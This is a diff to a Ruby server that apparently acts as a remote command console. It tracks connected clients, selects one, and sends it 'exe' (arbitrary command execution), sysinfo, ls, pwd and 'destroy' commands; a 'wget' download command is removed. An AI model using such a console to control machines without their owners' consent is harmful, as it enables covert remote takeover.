@@ -23,32 +23,33 @@ class Server
     loop do
       begin
         connection = @server.accept
-        puts "\nNew Connection: #{connection.peeraddr[3]}".green
-        duplicate_connection = false
+        client_id = client_count + 1
+        puts "\nNew Connection => ID: #{client_id} IP: #{connection.peeraddr[3]} ".green
 
-        @clients.each do |temp_client|
-          if connection == temp_client
-            duplicate_connection = true
-            puts "Attempted Duplicate Connection".red
-          end
-        end
-
-        unless duplicate_connection
-          client_id = client_count + 1
-          client = ClientConnection.new(
-            connection,
-            connection.peeraddr[3],
-            client_id
-          )
-          @clients[client_id] = client
-          @client_count += 1
-        end
+        client = ClientConnection.new(
+          connection,
+          connection.peeraddr[3],
+          client_id
+        )
+        @clients[client_id] = client
+        @client_count += 1
       rescue Exception => e
         puts e.message.red
         puts e.backtrace.join("\n").red
       end
     end
   end
+
+  # Commented out for now, heartbeat seemed to have no effect
+  #
+  #def heartbeat
+  #  # Attempt to identify if a client is closed and destroy it
+  #  get_clients.each do |temp_client|
+  #    if temp_client.connection.closed?
+  #      destroy_client(temp_client.uid)
+  #    end
+  #  end
+  #end
 
   def send_client(msg, client)
     begin
@@ -63,8 +64,8 @@ class Server
     begin
       len = client.connection.gets
       client.connection.read(len.to_i)
-    rescue Errno::ECONNRESET
-      puts "#{client.addr} ECONNRESET".red
+    rescue Exception => e
+      puts "#{e.message} RECV".red
       return
     end
   end
@@ -75,14 +76,34 @@ class Server
       raise NoMethodError if @current_client.nil?
       puts "Client #{id} selected".green
     rescue NoMethodError => e
-      puts "Invalid id: #{id}"
+      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
+    end
+  end
+
+  def unselect
+    @current_client = nil
+  end
+
+  def destroy_client(id)
+    begin
+      client = @clients[id]
+      raise NoMethodError if client.nil?
+      if @current_client
+        @current_client = nil if @current_client.uid == id
+      end
+
+      send_client('destroy', client)
+      @clients.delete(id)
+      puts "Client #{id} destroyed".red
+    rescue NoMethodError => e
+      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
     end
   end
 
   def list_clients
-    return 'No clients available' if @clients.empty?
+    return 'No clients available'.red if @clients.empty?
     str = ''
-    @clients.each_value { |client| puts client }
+    get_clients.each { |client| puts client }
     str
   end
 
@@ -100,47 +121,46 @@ class Server
   end
 
   def hardexit
-    print "Exit server and destroy all clients [y/n]: "
-    inp = $stdin.gets.chomp
-    if inp.downcase.include?('y')
+    print "Exit server and destroy all clients? [y/n]: "
+    inp = $stdin.gets.chomp.downcase
+    if inp == 'yes' || inp == 'y'
       get_clients.each { |client| send_client('destroy', client) }
       exit(0)
     end
   end
 
   def quit
-    print "Exit server and lose all clients [y/n]: "
-    inp = $stdin.gets.chomp
-    exit 0 if inp.downcase.include?('y')
-    return
+    print "Exit server but keep clients active? [y/n]: "
+    inp = $stdin.gets.chomp.downcase
+    exit 0 if inp == 'yes' || inp == 'y'
   end
 end
 
 class ClientConnection
   attr_accessor :connection, :addr, :uid
 
-  def initialize(connection, addr, uid=0)
+  def initialize(connection, addr, uid)
     @connection = connection
     @addr = addr
     @uid = uid
   end
 
   def to_s
-    result = "ID: #{@uid.to_s} IP: #{@addr.to_s}"
+    result = "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
   end
 end
 
 def start
   client_cmds = %w[
-    ls exe sysinfo pwd pid wget ifconfig
+    ls exe sysinfo pwd pid ifconfig
   ]
 
   general_cmds = %w[
-    select clients help history clear quit exit hardexit
+    select unselect clients help history destroy exit hardexit
   ]
 
   port = ARGV[0]
-  port ||= 3000
+  port ||= 3200
 
   client = nil
   data = nil
@@ -171,6 +191,8 @@ def start
     # Server/General Commands
     when 'select'
       server.select_client(action.to_i)
+    when 'unselect'
+      server.unselect
     when 'clients'
       puts server.list_clients
     when 'hardexit'
@@ -179,8 +201,17 @@ def start
       server.help(general_cmds, client_cmds)
     when 'history'
       history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
-    when 'clear'
-      `clear`
+    when 'destroy'
+      server.destroy_client(action.to_i)
+    when 'quit'
+      server.quit
+      next
+    when 'exit'
+      server.quit
+      next
+    when 'hardexit'
+      server.hardexit
+      next
     # Client Commands
     when 'sysinfo'
       server.send_client('sysinfo', server.current_client)
@@ -194,9 +225,6 @@ def start
     when 'pwd'
       server.send_client('pwd', server.current_client)
       data = server.recv_client(server.current_client)
-    when 'wget'
-      server.send_client("wget #{action}", server.current_client)
-      data = server.recv_client(server.current_client)
     when 'exe'
       next if action.nil?
       server.send_client(input, server.current_client)
@@ -204,17 +232,8 @@ def start
     when 'ls'
       server.send_client('ls', server.current_client)
       data = server.recv_client(server.current_client)
-    when 'quit'
-      server.quit
-      next
-    when 'exit'
-      server.quit
-      next
-    when 'hardexit'
-      server.hardexit
-      next
     else
-      puts "Unknown command: #{input}. Enter 'help' for availabe commands.".red
+      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
     end
     puts data unless data.nil?
     data = nil
